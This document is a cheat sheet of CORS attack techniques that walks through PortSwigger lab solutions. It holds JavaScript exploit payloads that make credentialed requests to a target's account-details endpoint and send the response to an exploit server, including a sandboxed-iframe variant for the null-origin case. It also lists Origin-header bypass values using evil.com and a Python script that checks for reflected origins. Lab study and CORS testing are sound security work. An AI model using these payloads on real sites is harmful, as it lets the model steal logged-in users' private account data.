# CORS Attack Techniques

## PortSwigger Lab Solutions

### Lab 1: Basic origin reflection
```
Origin: https://evil.com
# Server reflects back
Access-Control-Allow-Origin: https://evil.com
Access-Control-Allow-Credentials: true
```

**Exploit**:
```html
<script>
var req = new XMLHttpRequest();
req.onload = function() {
  location = "https://exploit/log?key=" + this.responseText;
};
req.open("get", "https://TARGET/accountDetails", true);
req.withCredentials = true;
req.send();
</script>
```

### Lab 2: Trusted null origin
```html
<iframe sandbox="allow-scripts" srcdoc="<script>
var req = new XMLHttpRequest();
req.onload = function() { parent.location='https://exploit/log?'+this.responseText; };
req.open('get','https://TARGET/accountDetails',true);
req.withCredentials=true;
req.send();
</script>"></iframe>
```

### Lab 3: Insecure protocol trust
```
Origin: http://subdomain.TARGET.com
# Server trusts HTTP origins
```

## Bypass Techniques

### Subdomain matching
```
Origin: https://evil.TARGET.com
```

### null Origin
```
Origin: null
```

### Special chars
```
Origin: https://TARGET.com@evil.com
Origin: https://TARGET.com#.evil.com
```

## Detection Script
```python
import requests
target = "https://TARGET/accountDetails"
for origin in ["https://evil.com", "null", "http://evil.TARGET.com"]:
    r = requests.get(target, headers={"Origin": origin})
    if r.headers.get("Access-Control-Allow-Origin") == origin:
        print(f"VULNERABLE: {origin}")
```
